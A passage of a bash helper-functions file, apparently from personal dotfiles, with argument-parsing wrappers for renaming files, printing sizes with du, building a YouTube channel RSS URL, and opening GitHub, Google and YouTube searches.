            NEW_NAME=$(echo "${NEW_NAME}" | tr ' ' '-' | tr '_' '-')
        else
            NEW_NAME=$(echo "${NEW_NAME}" | tr ' ' '_')
        fi

        PARENT="$(dirname "$1")"

        # mv -n = do not overwrite
        _echo_info "mv -n \"$1\" \"${PARENT}/${NEW_NAME}\"\n"
        mv -n "$1" "${PARENT}/${NEW_NAME}"
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local extra=false
    local file_path
    local lower=true
    local preserve=false
    local recursive=false
    local snake=false
    local source
    local train=false
    local upper=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :eluprsth option; do
            case "${option}" in
                l) lower=true; upper=false;;
                u) upper=true; lower=false;;
                e) extra=true;;
                p) preserve=false;;
                r) recursive=true;;
                s) snake=true; train=false;;
                t) train=true; snake=false;;
                h) _echo_warning 'rename\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Rename files recursively\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    # Check source validity
    if [ ! -f "${source}" ] && [ ! -d "${source}" ]; then
        _echo_danger "error: source: \"${source}\" is invalid\n"
        _usage 2 8

        return 1
    fi

    if [ ! -d "${source}" ] && [ "${recursive}" = true ]; then
        _echo_danger "error: source: \"${source}\" is not a valid directory\n"
        _usage 2 8

        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ -d "${source}" ] && [ "${recursive}" = true ]; then
        # sort -t '\0' -n => sort output alphabetically with separator
        find "${source}" -type f | sort -t '\0' -n | while read -r file_path; do
            _rename "${file_path}"
        done

        return 0
    fi

    if [ -d "${source}" ]; then
        find "${source}" -maxdepth 1 -type f | sort -t '\0' -n | while read -r file_path; do
            _rename "${file_path}"
        done

        return 0
    fi

    if [ -f "${source}" ]; then
        _rename "${source}"

        return 0
    fi
}

## Print total size of file and folders
function size() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'size [file/folder] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'size\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Print total size of file and folders\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 2 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    _echo_info "du -h \"${source}\" | tail -n1\n"
    du -h "${source}" | tail -n1
}

## Return the RSS URL for a given YouTube channel based on the channel ID or URL
function get_youtube_rss() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'get_youtube_rss [url/channel_id] -h (help)\n'
    }

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'get_youtube_rss\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Return the RSS URL for a given YouTube channel based on the channel ID or URL\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    ARGUMENT="${arguments[${LBOUND}]}"

    #--------------------------------------------------

    local CHANNEL_ID
    # `grep -oP '...'`
    # - `-o`: Only outputs the matching part of the string.
    # - `-P`: Uses Perl-compatible regular expressions, which allows advanced features like `\K`.
    #
    # `'(channel/|channel_id=)\K[0-9a-zA-Z_-]+'`
    # - `(channel/|channel_id=)`: Matches either `channel/` or `channel_id=`.
    # - `\K`: Tells `grep` to discard everything matched before this point. So `channel/` or `channel_id=` is matched but not included in the output.
    # - `[0-9a-zA-Z_-]+`: Matches one or more characters that are digits, letters, underscores, or hyphens — the actual ID.
    CHANNEL_ID=$(echo "${ARGUMENT}" | grep -oP '(channel/|channel_id=)\K[0-9a-zA-Z_-]+')

    if [ -z "${CHANNEL_ID}" ]; then
        CHANNEL_ID="${ARGUMENT}"
    fi

    echo "https://www.youtube.com/feeds/videos.xml?channel_id=${CHANNEL_ID}"
}

## Open github user profile
function github() {
    _echo_info "open \"https://github.com/${1:-${USER}}\"\n"
    open "https://github.com/${1:-${USER}}"
}

alias gg='google' ## google alias

## Search on google.com
function google() {
    # ${*}  : capture all the arguments passed to the function
    # // // : substitution using a separator.
    # It replaces all single spaces with a single space.

    _echo_info "open \"https://www.google.com/search?q=${*// /+}\"\n"
    open "https://www.google.com/search?q=${*// /+}"
}

alias yt='youtube' ## youtube alias

## Search on youtube.com
function youtube() {
    # ${*}  : capture all the arguments passed to the function
    # // // : substitution using a separator.
    # It replaces all single spaces with a "+" character.

    _echo_info "open \"https://www.youtube.com/results?search_query=${*// /+}\"\n"
    open "https://www.youtube.com/results?search_query=${*// /+}"
}
